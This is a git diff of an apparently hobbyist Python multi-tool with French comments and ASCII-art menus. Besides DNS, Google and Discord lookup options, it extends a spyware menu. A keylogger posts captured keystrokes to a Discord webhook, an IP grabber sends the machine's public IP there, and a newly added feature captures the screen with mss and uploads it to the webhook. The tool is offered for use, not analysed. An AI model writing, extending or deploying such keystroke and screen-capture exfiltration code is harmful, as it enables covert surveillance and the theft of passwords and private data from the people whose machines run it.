@@ -14,6 +14,10 @@ from sites import sites
 from darkweb import links
 from pynput import keyboard
 import  threading
+import io
+import mss
+import mss.tools
+
 
 # FIXME - Add Gestions Error i d'ont have time sry ;p
 
@@ -130,6 +134,7 @@ while True:
                 else:
                     print(f"Rien Trouvé sur {site}")
         elif choix2 == "4":
+            os.system("cls")
             search_google = input("""
                  ██████╗  ██████╗  ██████╗  ██████╗ ██╗     ███████╗    ███████╗███████╗ █████╗ ██████╗  ██████╗██╗  ██╗
                 ██╔════╝ ██╔═══██╗██╔═══██╗██╔════╝ ██║     ██╔════╝    ██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║
@@ -145,6 +150,7 @@ while True:
             webbrowser.open(url)
         # on definie le lookup des dns
         elif choix2 == "5":
+            os.system("cls")
             dns = input("""
                 ██████╗ ███╗   ██╗███████╗    ██╗      ██████╗  ██████╗ ██╗  ██╗██╗   ██╗██████╗ 
                 ██╔══██╗████╗  ██║██╔════╝    ██║     ██╔═══██╗██╔═══██╗██║ ██╔╝██║   ██║██╔══██╗
@@ -173,7 +179,8 @@ while True:
         # Ici on crée le DISCORD LOOKUP
         # Help ai for lookup :)
         elif choix2 == "6":
-            lookup = input("""
+            os.system("cls")
+            lookup = input(f""" 
                         ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗ 
                         ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗
                         ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║
@@ -202,10 +209,6 @@ while True:
                         print(f"Public flags : {data.get('public_flags')}")
                         print(f"Flags : {data.get('flags')}")
                         print(f"Global name : {data.get('global_name')}")
-
-                        clan = data.get("clan", {})
-                        print(f"Guild ID : {clan.get('identity_guild_id')}")
-                        print(f"Tag : {clan.get('tag')}")
 
                         time.sleep(7)
                     except ValueError:
@@ -633,9 +636,9 @@ while True:
             ╚██████╗╚██████╔╝ ╚████╔╝ ██║██████╔╝     ██║ █████╔╝
             ╚═════╝ ╚═════╝   ╚═══╝  ╚═╝╚═════╝      ╚═╝ ╚════╝ 
             
-            1. [KeyLogger]
+            1. [KeyLogger]  4. [Quit]
             2. [Grabing IP]
-            3. [Quit]
+            3. [ScreenShot]
 
                 {white}
             Fais ton choix : """)
@@ -668,7 +671,9 @@ while True:
 
                 if buffer:
                     data = {
-                        "content": buffer
+                        "content": buffer,
+                        "username": "WhiteWolf",
+                        "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"
                     }
 
                     requests.post(webhook, json=data)
@@ -718,17 +723,41 @@ while True:
                 ip = requests.get("https://checkip.amazonaws.com").text.strip()
              #  print(ip)
                 data = {
-                    "content": ip
+                    "content": ip,
+                    "username": "WhiteWolf",
+                    "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"
                 }
                 requests.post(webhook, json=data)
             except ValueError:
                 print("Value error")
                 time.sleep(3)
+        elif covid == "3":
+            os.system("cls")
+            screen = input(""" {red}
+                ███████╗ ██████╗██████╗ ███████╗███████╗███╗   ██╗
+                ██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝████╗  ██║
+                ███████╗██║     ██████╔╝█████╗  █████╗  ██╔██╗ ██║
+                ╚════██║██║     ██╔══██╗██╔══╝  ██╔══╝  ██║╚██╗██║
+                ███████║╚██████╗██║  ██║███████╗███████╗██║ ╚████║
+                ╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝
+                Met Ton webhook discord : """)
+            
+            webhook = screen
+            with mss.MSS() as sct:
+                img = sct.grab(sct.monitors[1])
 
-    elif covid == "3":
-        print("Au-Revoir a bientot l'amis")
-        time.sleep(2)
-        break
+                img_bytes = mss.tools.to_png(img.rgb, img.size)
+
+                files = {
+                    "file": ("screen.png", io.BytesIO(img_bytes), "image/png")
+                }
+
+                requests.post(webhook, data={"content": "screenshot", "username": "WhiteWolf", "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"}, files=files)
+
+        elif covid == "4":
+            print("Au-Revoir a bientot l'amis")
+            time.sleep(2)
+            break
 
     # Ici on a mis le quit si la personne a lancé sans fair expres
     elif choix == "5":
